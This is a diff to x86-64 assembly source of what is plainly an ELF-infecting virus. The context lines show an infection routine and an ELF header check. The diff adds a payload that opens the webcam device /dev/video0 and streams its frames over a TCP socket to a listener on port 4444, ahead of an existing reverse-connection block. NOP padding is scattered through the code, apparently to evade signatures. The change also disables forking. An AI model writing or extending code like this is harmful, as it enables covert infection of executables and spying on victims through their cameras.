@@ -620,7 +620,7 @@ prepare_infection:
 	cmp     rax, -4095
 	jae     .close_file
 
-	mov r14, rax 
+	mov r14, rax
 
 	; check is elf
 	cmp dword [r14], 0x464c457f
@@ -852,24 +852,104 @@ end_:
 	.just_quit:
 		POP_ALL
 
-		mov		rax, SYS_fork
-		syscall
+		;mov		rax, SYS_fork
+		;syscall
 
 		cmp		eax, 0
 		jng		.continue_fork
 
-		mov		rax, SYS_exit
-		xor		rdi, rdi
+		;mov		rax, SYS_exit
+		;xor		rdi, rdi
 		NOP
 		NOP
 		NOP
 		NOP
-		syscall
+		;syscall
 
 	.continue_fork:
-		mov		rax, SYS_setsid
+		;mov		rax, SYS_setsid
+		;syscall
+
+		mov		rax, SYS_open
+		lea		rdi, [rel pathv]
+		xor		rsi, rsi
+		NOP
+		NOP
+		NOP
+		NOP
+		xor		rdx, rdx
+		NOP
+		NOP
+		NOP
+		NOP
+		syscall
+		cmp		rax, 0
+		jl		.continue_reverse
+		mov		r12, rax	; file descriptor de video0
+
+		mov		rax, SYS_socket
+		mov		rdi, AF_INET
+		mov		rsi, SOCK_STREAM
+		xor		rdx, rdx
+		NOP
+		NOP
+		NOP
+		NOP
+		syscall
+		mov		r13, rax	; le socket
+
+		mov		rax, SYS_connect
+		mov		rdi, r13
+		lea		rsi, [rel serv_addr_video]
+		mov		rdx, 16
+		syscall
+		test	rax, rax
+		jnz		.closing_video
+
+		lea		rdi, [rel buff] ; bien clean le buff au cas ou pour la video
+		mov		rcx, 512
+		xor		rax, rax
+		NOP
+		NOP
+		NOP
+		NOP
+		rep		stosq
+
+		mov		rcx, 10
+		.loop_video
+
+		push	rcx
+		mov		rdx, 4096
+		mov		rax, SYS_read
+		mov		rdi, r12
+		lea		rsi, [rel buff]
+		syscall
+		pop		rcx
+
+		cmp		rax, 0
+		jle		.closing_video
+
+		push	rcx
+		mov		rdx, rax
+		mov		rax, SYS_write
+		mov		rdi, r13
+		lea		rsi, [rel buff]
+		syscall
+		pop		rcx
+
+		loop	.loop_video
+
+		.closing_video:
+		mov		rax, SYS_close
+		mov		rdi, r12
 		syscall
 
+		mov		rax, SYS_close
+		mov		rdi, r13
+		syscall
+
+
+		.continue_reverse:
 		mov		rax, SYS_socket
 		mov		rdi, AF_INET
 		mov		rsi, SOCK_STREAM
@@ -936,6 +1016,7 @@ _stop:
 	self	db '/proc/self/exe', 0
 	last	db '..', 0
 	curr	db '.', 0
+	pathv	db '/dev/video0', 0
 	one		db 1
 	zero	db 0
 	paddi	dq 0
@@ -943,6 +1024,12 @@ _stop:
 	exec	dd 7
 	urandom_path : db '/dev/urandom', 0
 	randbuf: dq 0
+	serv_addr_video:
+		dw AF_INET
+		dw 0x5c11			; 4444
+		dd 0x0100007F		; 127.0.0.1
+		times 8 db 0
+
 	serv_addr:
 		dw AF_INET
 		dw 0x901F			; 8080
